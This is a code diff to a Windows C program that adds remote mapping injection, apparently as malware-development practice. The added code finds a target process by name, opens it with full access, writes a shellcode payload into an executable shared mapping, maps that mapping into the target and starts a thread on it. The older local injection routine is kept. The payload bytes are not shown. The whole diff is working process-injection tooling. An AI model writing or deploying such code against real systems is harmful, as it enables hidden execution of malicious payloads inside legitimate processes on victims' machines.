@@ -1,10 +1,12 @@
-#include <Windows.h>
+#include <windows.h>
+#include <tchar.h>
+#include <psapi.h>
 #include "tlhelp32.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 
-
+#pragma comment (lib, "OneCore.lib")
 
 BOOL localmappinjection(IN PBYTE pPayload,OUT PVOID*ppAddress,IN SIZE_T sPayloadSize) {
 
@@ -45,9 +47,105 @@ BOOL localmappinjection(IN PBYTE pPayload,OUT PVOID*ppAddress,IN SIZE_T sPayload
 		CloseHandle(hFile);
 	return TRUE;
 
+}
 
-	
 
+BOOL RemoteMappingInjection(IN HANDLE hProcess,PBYTE pPayload,OUT PVOID *ppAddress, IN SIZE_T sPayloadSize) {
+
+	HANDLE hFile = NULL;
+	PVOID 	pMapAddress = NULL;
+	PVOID 	pMapRemoteAddress = NULL;
+
+
+	hFile = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL, PAGE_EXECUTE_READWRITE, NULL, sPayloadSize, NULL);
+	if (hFile == NULL) {
+		printf("Can't create file mapping for our target ! ERROR : 0x%lx", GetLastError());
+		return FALSE;
+	}
+	printf("Mapped successfully!\n");
+	pMapAddress = MapViewOfFile(hFile, FILE_MAP_WRITE | FILE_MAP_EXECUTE, NULL, NULL, sPayloadSize);
+	if (pMapAddress == NULL) {
+		printf("Can't map the payload successfully ! ERROR : 0x%lx \n", GetLastError());
+		CloseHandle(hFile);
+		return FALSE;
+	}
+	printf("Map extracted successfully!\n");
+
+
+	printf("[#] Press <Enter> To Copy The Payload ... ");
+	getchar();
+
+	printf("[i] Copying Payload To 0x%p ... ", pMapAddress);
+
+	if (!memcpy(pMapAddress, pPayload, sPayloadSize)) {
+		printf("memcpy failed with ERROR : 0x%lx\n", GetLastError());
+		return FALSE;
+	}
+
+	printf("Payload copied successfully!! \n");
+	pMapRemoteAddress = MapViewOfFile2(hFile,hProcess,NULL,NULL,NULL,NULL,PAGE_EXECUTE_READWRITE);
+	if (pMapRemoteAddress == NULL) {
+		printf("Can't map the payload in the Remote process ! ERROR : 0x%lx \n", GetLastError());
+		CloseHandle(hFile);
+		return FALSE;
+	}
+
+	printf("\t[+] Remote Mapping Address : 0x%p \n",	pMapRemoteAddress);
+
+	printf("Press enter to exit ! \n");
+	getchar();
+
+	*ppAddress = pMapAddress;
+
+
+	if (hFile)
+		CloseHandle(hFile);
+	return TRUE;
+
+}
+
+
+void PrintProcessNameAndID(DWORD processID, const WCHAR* target, DWORD& foundPID) {
+	TCHAR szProcessName[MAX_PATH] = TEXT("<unknown>");
+
+	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processID);
+
+	if (hProcess != NULL) {
+		HMODULE hMod;
+		DWORD cbNeeded;
+
+		if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
+			GetModuleBaseName(hProcess, hMod, szProcessName, sizeof(szProcessName) / sizeof(TCHAR));
+		}
+
+		if (_wcsicmp(szProcessName, target) == 0) {
+			foundPID = processID;
+			wprintf(L"Target process found: %s (PID: %u)\n", szProcessName, processID);
+		}
+
+		CloseHandle(hProcess);
+	}
+}
+
+
+void PrintAllProcesses(const WCHAR* target, DWORD& foundPID) {
+	DWORD processes[1024], cbNeeded, processCount;
+
+	if (!EnumProcesses(processes, sizeof(processes), &cbNeeded)) {
+		printf("EnumProcesses failed.\n");
+		return;
+	}
+
+	processCount = cbNeeded / sizeof(DWORD);
+
+	for (unsigned int i = 0; i < processCount; i++) {
+		if (processes[i] != 0) {
+			PrintProcessNameAndID(processes[i], target, foundPID);
+			if (foundPID != 0) {
+				break;
+			}
+		}
+	}
 }
 
 unsigned char Payload[] =
@@ -92,11 +190,72 @@ unsigned char Payload[] =
 
 
 
-int main() {
-
+int main(int argc,char* argv[]) {
+	
 	PVOID	pAddress = NULL;
 	HANDLE	hThread = NULL;
 
+	//Remote mapping injection
+	if (argc < 2) {
+		printf("Usage: <exe> <Process Name>\n");
+		return EXIT_FAILURE;
+	}
+
+	DWORD PID = 0, TID = NULL;
+	WCHAR target[MAX_PATH];
+	size_t convertedChars = 0;
+
+	mbstowcs_s(&convertedChars, target, MAX_PATH, argv[1], _TRUNCATE);
+
+	PrintAllProcesses(target, PID);
+
+
+	if (PID == 0) {
+		printf("Target process not found.\n");
+		return EXIT_FAILURE;
+	}
+
+
+	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
+	if (hProcess == NULL) {
+		printf("Failed to open process (PID: %ld), error: %ld\n", PID, GetLastError());
+		return EXIT_FAILURE;
+	}
+
+	
+	printf("Process handled successfully ! \n");
+	
+
+	if (!RemoteMappingInjection(hProcess,Payload, &pAddress, sizeof(Payload))) {
+		printf("Can't map! \n");
+		return -1;
+	}
+
+	printf("Payload address 0x%lx", pAddress);
+
+	printf("[i] Creating New Thread ... ");
+
+	hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pAddress, NULL, NULL, NULL);
+
+
+	if (hThread != NULL) {
+		WaitForSingleObject(hThread, INFINITE);
+		printf("[+] DONE \n");
+	}
+	else
+		printf("[!] CreateThread Failed With Error : %d \n", GetLastError());
+
+
+	printf("[#] Press <Enter> To Quit ... ");
+	getchar();
+
+
+
+
+
+
+	//This is the Local mapping injection
+	
 	if (!localmappinjection(Payload, &pAddress,sizeof(Payload))) {
 		return -1;
 	}
